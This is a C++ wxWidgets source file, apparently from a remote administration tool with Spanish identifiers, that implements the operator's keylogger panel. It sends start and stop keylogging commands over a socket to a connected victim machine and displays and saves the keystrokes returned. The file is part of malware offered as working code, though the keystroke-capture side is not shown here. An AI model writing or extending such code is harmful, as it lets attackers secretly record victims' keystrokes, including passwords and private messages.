#include "panel_keylogger.hpp"
#include "frame_client.hpp"
#include "server.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelKeylogger, wxPanel)
	EVT_TOGGLEBUTTON(EnumIDS::ID_KL_BTN_Toggle, panelKeylogger::OnToggle)
	EVT_BUTTON(EnumIDS::ID_KL_BTN_Clear, panelKeylogger::OnLimpiar)
	EVT_BUTTON(EnumIDS::ID_KL_BTN_Save, panelKeylogger::OnGuardarLog)
wxEND_EVENT_TABLE()

panelKeylogger::panelKeylogger(wxWindow* pParent, SOCKET sck) :
	wxPanel(pParent, EnumIDS::ID_KL_Panel) {

	this->sckCliente = sck;
	
	this->btn_Iniciar = new wxToggleButton(this, EnumIDS::ID_KL_BTN_Toggle, "Iniciar");
	
	wxSize btn_size = this->btn_Iniciar->GetSize();

	wxButton* btn_Save = new wxButton(this, EnumIDS::ID_KL_BTN_Save, "Guardar log", wxDefaultPosition, btn_size);
	wxButton* btn_Clear = new wxButton(this, EnumIDS::ID_KL_BTN_Clear, "Limpiar log", wxDefaultPosition, btn_size);

	this->txt_Data = new wxTextCtrl(this, EnumIDS::ID_KL_Text_Out, wxEmptyString, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH * 3, FRAME_CLIENT_SIZE_WIDTH * 3), wxTE_MULTILINE | wxTE_RICH);

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	wxBoxSizer* sizer2 = new wxBoxSizer(wxVERTICAL);

	sizer->Add(this->btn_Iniciar, 1, wxALL | wxEXPAND, 1);
	sizer->Add(btn_Save, 1, wxALL | wxEXPAND, 1);
	sizer->Add(btn_Clear, 1, wxALL | wxEXPAND, 1);
	
	sizer2->Add(sizer);
	sizer2->Add(this->txt_Data, 1, wxALL | wxEXPAND, 1);

	this->SetSizerAndFit(sizer2);


}

void panelKeylogger::OnGuardarLog(wxCommandEvent& event) {
	wxFileDialog dialog(this, "Guardar archivo", wxEmptyString, "log.txt", wxFileSelectorDefaultWildcardStr, wxFD_SAVE | wxFD_OVERWRITE_PROMPT);
	if (dialog.ShowModal() == wxID_OK) {
		std::ofstream outFile(std::string(dialog.GetPath()), std::ios::binary);

		if (outFile.is_open()) {
			std::string strBuffer = this->txt_Data->GetValue();
			outFile.write(strBuffer.c_str(), strBuffer.size());

			outFile.flush();
			outFile.close();
		}else {
			ERROR_EW("[X] No se pudo abrir el archivo " << dialog.GetPath());
		}
	}
}

void panelKeylogger::OnLimpiar(wxCommandEvent& event) {
	if (this->txt_Data) {
		this->txt_Data->Clear();
	}
}

void panelKeylogger::OnToggle(wxCommandEvent& event) {
	bool isSel = this->btn_Iniciar->GetValue();
	std::string strComando = "";
	if (isSel) {
		//Iniciar keylogger
		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Iniciar);
		this->btn_Iniciar->SetLabelText(wxT("Detener"));
	}else {
		//Apagar keylogger
		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::KL_Detener);
		this->btn_Iniciar->SetLabelText(wxT("Iniciar"));
	}
}

void panelKeylogger::AgregarData(const char*& pBuffer) {
	if (this->txt_Data) {
		this->txt_Data->AppendText(wxString(pBuffer));
	}
}